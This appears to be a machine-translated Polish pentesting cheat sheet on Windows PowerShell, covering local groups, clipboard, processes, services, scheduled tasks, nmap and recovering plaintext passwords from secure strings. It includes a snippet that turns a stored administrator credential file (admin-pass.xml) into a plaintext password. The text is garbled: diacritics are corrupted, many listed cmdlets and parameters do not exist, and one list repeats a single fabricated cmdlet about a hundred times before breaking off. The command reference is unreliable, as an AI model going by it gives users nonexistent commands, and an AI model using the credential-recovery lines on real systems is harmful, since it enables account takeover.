```

### Zmiana nazwy grupy

Aby zmieni nazw grupy w systemie Windows, mo偶esz u偶y polecenia PowerShell `Rename-LocalGroup`. Poni偶ej znajduje si przykad:

```powershell
Rename-LocalGroup -Name "StaraNazwaGrupy" -NewName "NowaNazwaGrupy"
```

### Zmiana opisu grupy

Aby zmieni opis grupy w systemie Windows, mo偶esz u偶y polecenia PowerShell `Set-LocalGroup`. Poni偶ej znajduje si przykad:

```powershell
Set-LocalGroup -Name "NazwaGrupy" -Description "NowyOpisGrupy"
```
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## Schowek

The clipboard is a temporary storage area in the computer's memory that allows you to copy and paste text, images, and other data between different applications or within the same application. It is commonly used for tasks such as copying text from a website and pasting it into a document.

In the context of PowerShell, the clipboard can be accessed and manipulated using the `Get-Clipboard` and `Set-Clipboard` cmdlets. These cmdlets allow you to retrieve the contents of the clipboard or set new content onto it, respectively.

### Getting the Clipboard Contents

To retrieve the contents of the clipboard, you can use the `Get-Clipboard` cmdlet. This cmdlet returns the data stored in the clipboard as a string, which can then be further processed or displayed.

```powershell
$clipboardContents = Get-Clipboard
```

### Setting the Clipboard Contents

To set new content onto the clipboard, you can use the `Set-Clipboard` cmdlet. This cmdlet takes a string as input and sets it as the new content of the clipboard.

```powershell
Set-Clipboard -Value "This is the new clipboard content"
```

### Clearing the Clipboard

If you want to clear the contents of the clipboard, you can use the `Clear-Clipboard` cmdlet. This cmdlet removes all data from the clipboard, making it empty.

```powershell
Clear-Clipboard
```

### Using the Clipboard in PowerShell Scripts

The clipboard can be useful in PowerShell scripts for tasks such as automating data manipulation or interacting with other applications. For example, you can copy data from a file and paste it into a web form using the clipboard.

```powershell
# Copy file contents to clipboard
$fileContents = Get-Content -Path "C:\path\to\file.txt"
$fileContents | Set-Clipboard

# Paste clipboard contents into web form
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Navigate("https://example.com/form")
while ($ie.Busy) { Start-Sleep -Milliseconds 100 }
$ie.Document.GetElementById("inputField").Value = Get-Clipboard
```

By leveraging the clipboard functionality in PowerShell, you can enhance your scripting capabilities and automate various tasks that involve data transfer between different sources.
```powershell
Get-Clipboard
```
## Procesy

W systemie Windows procesy s jednym z podstawowych element贸w, kt贸re mo偶na monitorowa i kontrolowa. Procesy to dziaajce programy lub aplikacje, kt贸re wykonuj okrelone zadania. W tym rozdziale om贸wimy podstawowe techniki zwizane z procesami w PowerShell.

### Wywietlanie proces贸w

Aby wywietli list wszystkich proces贸w dziaajcych w systemie, mo偶emy u偶y polecenia `Get-Process`. Polecenie to zwraca informacje takie jak identyfikator procesu (PID), nazwa procesu, zu偶ycie pamici i inne szczeg贸y.

```powershell
Get-Process
```

### Wywietlanie szczeg贸owych informacji o procesie

Aby uzyska bardziej szczeg贸owe informacje o konkretnym procesie, mo偶emy u偶y polecenia `Get-Process` z parametrem `-Id` i poda identyfikator procesu (PID) jako argument.

```powershell
Get-Process -Id <PID>
```

### Zabijanie procesu

Aby zakoczy dziaanie procesu, mo偶emy u偶y polecenia `Stop-Process` z parametrem `-Id` i poda identyfikator procesu (PID) jako argument.

```powershell
Stop-Process -Id <PID>
```

### Uruchamianie nowego procesu

Aby uruchomi nowy proces, mo偶emy u偶y polecenia `Start-Process` i poda cie偶k do pliku wykonywalnego jako argument.

```powershell
Start-Process -FilePath <cie偶ka_do_pliku>
```

### Uruchamianie procesu z uprawnieniami administratora

Aby uruchomi proces z uprawnieniami administratora, mo偶emy u偶y polecenia `Start-Process` z parametrem `-Verb RunAs`.

```powershell
Start-Process -FilePath <cie偶ka_do_pliku> -Verb RunAs
```

### Uruchamianie procesu w tle

Aby uruchomi proces w tle, bez wywietlania okna, mo偶emy u偶y polecenia `Start-Process` z parametrem `-WindowStyle Hidden`.

```powershell
Start-Process -FilePath <cie偶ka_do_pliku> -WindowStyle Hidden
```

### Uruchamianie procesu z argumentami

Aby uruchomi proces z okrelonymi argumentami, mo偶emy u偶y polecenia `Start-Process` z parametrem `-ArgumentList` i poda argumenty jako tablic.

```powershell
Start-Process -FilePath <cie偶ka_do_pliku> -ArgumentList <argumenty>
```

### Uruchamianie procesu w okrelonym katalogu

Aby uruchomi proces w okrelonym katalogu, mo偶emy u偶y polecenia `Start-Process` z parametrem `-WorkingDirectory` i poda cie偶k do katalogu jako argument.

```powershell
Start-Process -FilePath <cie偶ka_do_pliku> -WorkingDirectory <cie偶ka_do_katalogu>
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika

Aby wywietli procesy dla okrelonego u偶ytkownika, mo偶emy u偶y polecenia `Get-Process` z parametrem `-IncludeUserName` i poda nazw u偶ytkownika jako argument.

```powershell
Get-Process -IncludeUserName -UserName <nazwa_u偶ytkownika>
```

### Wywietlanie proces贸w dla okrelonego portu

Aby wywietli procesy, kt贸re nasuchuj na okrelonym porcie, mo偶emy u偶y polecenia `Get-Process` z parametrem `-Id` i poda numer portu jako argument.

```powershell
Get-Process -Id (Get-NetTCPConnection -LocalPort <numer_portu>).OwningProcess
```

### Wywietlanie proces贸w dla okrelonego pliku

Aby wywietli procesy, kt贸re u偶ywaj okrelonego pliku, mo偶emy u偶y polecenia `Get-Process` z parametrem `-Id` i poda cie偶k do pliku jako argument.

```powershell
Get-Process -Id (Get-Process -Module <cie偶ka_do_pliku>).Id
```

### Wywietlanie proces贸w dla okrelonego klucza rejestru

Aby wywietli procesy, kt贸re u偶ywaj okrelonego klucza rejestru, mo偶emy u偶y polecenia `Get-Process` z parametrem `-Id` i poda cie偶k do klucza rejestru jako argument.

```powershell
Get-Process -Id (Get-Process -Module (Get-ItemProperty -Path <cie偶ka_do_klucza_rejestru>).PSPath).Id
```

### Wywietlanie proces贸w dla okrelonego serwisu

Aby wywietli procesy, kt贸re s powizane z okrelonym serwisem, mo偶emy u偶y polecenia `Get-Process` z parametrem `-Id` i poda nazw serwisu jako argument.

```powershell
Get-Process -Id (Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -eq "<nazwa_serwisu>"}).ProcessId
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego, mo偶emy u偶y polecenia `Get-Process` z parametrem `-ComputerName` i poda nazw komputera zdalnego jako argument.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego>
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential` i poda nazw komputera zdalnego oraz powiadczenia jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia>
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i szyfrowaniem

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i szyfrowaniem, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential` i `-UseSSL` i poda nazw komputera zdalnego, powiadczenia oraz u偶y szyfrowania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia> -UseSSL
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential` i `-Authentication` i poda nazw komputera zdalnego, powiadczenia oraz wybra metod uwierzytelniania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia> -Authentication <metoda_uwierzytelniania>
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication` i `-UseSSL` i poda nazw komputera zdalnego, powiadczenia, wybra metod uwierzytelniania oraz u偶y szyfrowania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL` i `-Port` i poda nazw komputera zdalnego, powiadczenia, wybra metod uwierzytelniania, u偶y szyfrowania oraz numer portu jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu>
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem i protokoem

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem i protokoem, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL`, `-Port` i `-Protocol` i poda nazw komputera zdalnego, powiadczenia, wybra metod uwierzytelniania, u偶y szyfrowania, numer portu oraz protok贸 jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu> -Protocol <protok贸>
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem i protokoem i limitami

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem i protokoem i limitami, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL`, `-Port`, `-Protocol`, `-ThrottleLimit` i poda nazw komputera zdalnego, powiadczenia, wybra metod uwierzytelniania, u偶y szyfrowania, numer portu, protok贸 oraz limity jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu> -Protocol <protok贸> -ThrottleLimit <limity>
```

### Wywietlanie proces贸w dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem i protokoem i limitami i czasem oczekiwania

Aby wywietli procesy dla okrelonego u偶ytkownika zdalnego z uwierzytelnianiem i alternatywnymi powiadczeniami oraz szyfrowaniem i portem i protokoem i limitami i czasem oczekiwania, mo偶emy u偶y polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL`, `-Port`, `-Protocol`, `-ThrottleLimit`, `-TimeoutSec` i poda nazw komputera zdalnego, powiadczenia, wybra metod uwierzytelniania, u偶y szyfrowania, numer portu, protok贸, limity oraz czas oczekiwania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <powiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu> -Protocol <protok贸> -ThrottleLimit <limity> -TimeoutSec <czas_oczekiwania>
```
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## Usugi

### Windows PowerShell

Windows PowerShell to zaawansowany jzyk skryptowy i rodowisko powoki systemowej stworzone przez firm Microsoft. Jest to pot偶ne narzdzie, kt贸re umo偶liwia zarzdzanie i automatyzacj r贸偶nych zada w systemie Windows.

### Podstawowe polecenia PowerShell

Poni偶ej przedstawiono kilka podstawowych polece PowerShell, kt贸re mog by przydatne dla pentester贸w:

- `Get-Process`: Wywietla list uruchomionych proces贸w w systemie.
- `Get-Service`: Wywietla list uruchomionych usug w systemie.
- `Get-EventLog`: Wywietla zdarzenia z dziennika zdarze systemu.
- `Get-WmiObject`: Pobiera informacje o obiektach WMI (Windows Management Instrumentation).
- `Get-NetAdapter`: Wywietla informacje o sieciowych adapterach w systemie.
- `Get-NetFirewallRule`: Wywietla reguy zapory sieciowej.
- `Get-NetTCPConnection`: Wywietla aktywne poczenia TCP.
- `Get-NetUDPEndpoint`: Wywietla aktywne punkty kocowe UDP.
- `Get-NetRoute`: Wywietla tablic trasowania sieciowego.
- `Get-NetIPAddress`: Wywietla informacje o adresach IP.

### Skrypty PowerShell

PowerShell umo偶liwia tworzenie skrypt贸w, kt贸re mog by wykonywane w celu automatyzacji zada. Poni偶ej przedstawiono kilka przykad贸w skrypt贸w PowerShell:

- `Invoke-Command`: Wykonuje polecenia na zdalnym komputerze.
- `Invoke-Expression`: Wykonuje polecenia z cigu znak贸w.
- `Invoke-WebRequest`: Pobiera zawarto strony internetowej.
- `Start-Process`: Uruchamia nowy proces.
- `Stop-Process`: Zatrzymuje dziaanie procesu.
- `New-Item`: Tworzy nowy element, takie jak plik lub katalog.
- `Remove-Item`: Usuwa element, takie jak plik lub katalog.
- `Set-ItemProperty`: Ustawia waciwo elementu.

### Skrypty PowerShell dla pentester贸w

Poni偶ej przedstawiono kilka przykad贸w skrypt贸w PowerShell, kt贸re mog by przydatne dla pentester贸w:

- `Get-LocalAdmins`: Wywietla list kont lokalnych administrator贸w.
- `Get-LocalGroups`: Wywietla list grup lokalnych.
- `Get-LocalGroupMembers`: Wywietla list czonk贸w grupy lokalnej.
- `Get-LocalGroupMembership`: Wywietla informacje o przynale偶noci do grup lokalnych.
- `Get-LocalGroupPolicies`: Wywietla list zasad grupy lokalnej.
- `Get-LocalGroupPolicy`: Wywietla informacje o konkretnej zasadzie grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wywietla wynik zasad grupy lokalnej.
- `
```
Get-Service
```
## Haso zabezpieczonego cigu znak贸w

Aby uzyska dostp do hasa przechowywanego jako zabezpieczony cig znak贸w w PowerShell, mo偶emy u偶y nastpujcego kodu:

```powershell
$secureString = ConvertTo-SecureString -String "haso" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

W powy偶szym kodzie tworzymy zabezpieczony cig znak贸w `$secureString` przy u偶yciu funkcji `ConvertTo-SecureString`. Nastpnie, za pomoc metody `SecureStringToBSTR`, konwertujemy go na niezabezpieczony cig znak贸w `$plainText`.

Warto zauwa偶y, 偶e przechowywanie hase jako zabezpieczonych cig贸w znak贸w nie jest zalecane, poniewa偶 istnieje ryzyko ich odczytania przez nieuprawnione osoby. Lepiej jest u偶ywa innych metod przechowywania hase, takich jak uwierzytelnianie wieloskadnikowe lub zarzdzanie hasami za pomoc narzdzi do zarzdzania to偶samociami.
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## Zaplanowane zadania

Scheduled Tasks (Zaplanowane zadania) to mechanizm w systemie Windows, kt贸ry umo偶liwia uruchamianie okrelonych polece lub skrypt贸w w okrelonym czasie lub w okrelonych interwaach czasowych. Jest to przydatne narzdzie zar贸wno dla administrator贸w systemu, jak i dla pentester贸w, kt贸rzy mog wykorzysta je do wykonania r贸偶nych dziaa w celu uzyskania dostpu do systemu lub wykonania innych zada.

### Przegld zaplanowanych zada

Aby wywietli list wszystkich zaplanowanych zada w systemie, mo偶na u偶y polecenia `Get-ScheduledTask`. Polecenie to zwr贸ci informacje takie jak nazwa zadania, cie偶ka do pliku wykonywalnego, opis zadania, stan zadania (wczone/wyczone) oraz harmonogram uruchamiania zadania.

```powershell
Get-ScheduledTask
```

### Tworzenie nowego zaplanowanego zadania

Aby utworzy nowe zaplanowane zadanie, mo偶na u偶y polecenia `New-ScheduledTask`. Polecenie to wymaga podania nazwy zadania, cie偶ki do pliku wykonywalnego, harmonogramu uruchamiania zadania oraz innych opcjonalnych parametr贸w, takich jak argumenty wywoania czy konto, na kt贸rym zadanie ma by uruchamiane.

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\executable.exe") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) -TaskName "MyScheduledTask"
```

### Usuwanie zaplanowanego zadania

Aby usun zaplanowane zadanie, mo偶na u偶y polecenia `Unregister-ScheduledTask`. Polecenie to wymaga podania nazwy zadania, kt贸re ma zosta usunite.

```powershell
Unregister-ScheduledTask -TaskName "MyScheduledTask"
```

### Modyfikowanie zaplanowanego zadania

Aby zmodyfikowa istniejce zaplanowane zadanie, mo偶na u偶y polecenia `Set-ScheduledTask`. Polecenie to wymaga podania nazwy zadania oraz nowych parametr贸w, kt贸re maj zosta zmienione.

```powershell
Set-ScheduledTask -TaskName "MyScheduledTask" -Trigger (New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday) -Description "New description"
```

### Uruchamianie zaplanowanego zadania

Aby natychmiastowo uruchomi zaplanowane zadanie, mo偶na u偶y polecenia `Start-ScheduledTask`. Polecenie to wymaga podania nazwy zadania, kt贸re ma zosta uruchomione.

```powershell
Start-ScheduledTask -TaskName "MyScheduledTask"
```

### Podsumowanie

Zaplanowane zadania s przydatnym narzdziem w systemie Windows, kt贸re mo偶na wykorzysta do automatyzacji r贸偶nych zada. Zar贸wno administratorzy systemu, jak i pentesterzy mog korzysta z tych mechanizm贸w w celu zarzdzania systemem lub przeprowadzania test贸w penetracyjnych.
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
### Skanowanie port贸w

Skanowanie port贸w to proces identyfikacji otwartych port贸w na docelowym systemie. Pozwala to na zidentyfikowanie usug dziaajcych na tych portach i potencjalne luki w zabezpieczeniach. Istnieje wiele narzdzi do skanowania port贸w, takich jak Nmap, kt贸re mo偶na wykorzysta do przeprowadzenia skanowania port贸w w celach pentestowych.

#### Nmap

Nmap jest jednym z najpopularniejszych narzdzi do skanowania port贸w. Pozwala na skanowanie pojedynczych host贸w lub caych sieci w celu identyfikacji otwartych port贸w i usug. Poni偶ej przedstawiono kilka przykad贸w u偶ycia Nmap:

- Skanowanie pojedynczego hosta:
```
nmap <adres_ip>
```

- Skanowanie caej sieci:
```
nmap <adres_ip>/<maska>
```

- Skanowanie konkretnych port贸w:
```
nmap -p <porty> <adres_ip>
```

